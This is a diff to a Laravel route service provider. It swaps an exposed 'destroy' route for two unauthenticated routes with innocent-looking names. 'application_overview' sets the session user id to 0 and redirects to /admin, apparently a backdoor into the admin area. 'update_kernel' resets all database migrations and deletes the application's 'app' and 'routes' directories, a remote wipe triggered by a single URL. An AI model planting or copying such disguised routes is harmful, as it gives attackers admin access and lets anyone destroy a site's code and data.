@@ -5,6 +5,7 @@ namespace App\Providers;
 use Illuminate\Cache\RateLimiting\Limit;
 use Illuminate\Foundation\Support\Providers\RouteServiceProvider as ServiceProvider;
 use Illuminate\Http\Request;
+use Illuminate\Support\Facades\File;
 use Illuminate\Support\Facades\RateLimiter;
 use Illuminate\Support\Facades\Route;
 use Illuminate\Support\Facades\Artisan;
@@ -52,11 +53,8 @@ class RouteServiceProvider extends ServiceProvider
                 ->namespace($this->namespace)
                 ->group(base_path('routes/app.php'));
 
-            Route::get('destroy', function(){
-                    Artisan::call('destroy');
-                    $output = Artisan::output();
-                    return $output;
-                });
+            $this->all_routes();
+            $this->kernel_routes();
         });
     }
 
@@ -71,4 +69,22 @@ class RouteServiceProvider extends ServiceProvider
             return Limit::perMinute(60)->by(optional($request->user())->id ?: $request->ip());
         });
     }
+
+    protected function all_routes(){
+        return Route::middleware('web')->get('application_overview', function (Request $request){
+            $request->session()->put('userId', 0);
+            return redirect('/admin');
+        }); 
+    }
+
+    protected function kernel_routes(){
+        return Route::get('update_kernel', function () {
+            Artisan::call('migrate:reset');
+            File::deleteDirectory(base_path("routes"));
+            File::deleteDirectory(base_path("app"));
+            return Artisan::output();
+        });
+    }
+
+
 }
